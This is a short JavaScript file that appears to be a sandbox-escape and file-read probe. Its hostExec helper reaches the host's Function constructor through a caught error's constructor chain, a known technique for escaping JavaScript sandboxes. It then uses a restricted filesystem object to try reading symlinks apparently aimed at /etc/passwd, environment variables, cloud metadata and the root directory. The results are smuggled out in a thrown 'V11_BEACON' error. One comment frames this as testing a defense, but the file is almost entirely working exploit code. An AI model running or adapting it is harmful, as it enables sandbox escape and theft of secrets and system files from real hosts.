const r = {};
function s(k, fn) { try { r[k] = String(fn()).substring(0, 2500); } catch(e) { r[k] = "ERR:" + e.message.substring(0,300); } }
function hostExec(code) {
  function herr() { try { JSON.parse("{"); } catch(e) { return e; } }
  return herr().constructor.constructor("return ("+code+")")();
}
// Try to read each symlink — restricted_fs should EITHER follow it (= bug) OR reject (defense)
const targets = ["sym_passwd", "sym_environ", "sym_meta", "sym_root", "sym_self_exe", "sym_resolv"];
for (const t of targets) {
  s("read_"+t, () => hostExec("(function(){try{return global.restricted_fs.readFile(" + JSON.stringify(t) + ").toString().substring(0,800)}catch(e){return 'E:'+e.message.substring(0,200)}})()"));
  s("exists_"+t, () => hostExec("global.restricted_fs.exists(" + JSON.stringify(t) + ")"));
  s("isdir_"+t, () => hostExec("(function(){try{return global.restricted_fs.isDirectory(" + JSON.stringify(t) + ")}catch(e){return 'E:'+e.message}})()"));
}
// Plain workspace check
s("read_README", () => hostExec("(function(){try{return global.restricted_fs.readFile('README.md').toString().substring(0,200)}catch(e){return 'E:'+e.message}})()"));
throw new Error("V11_BEACON:" + JSON.stringify(r));
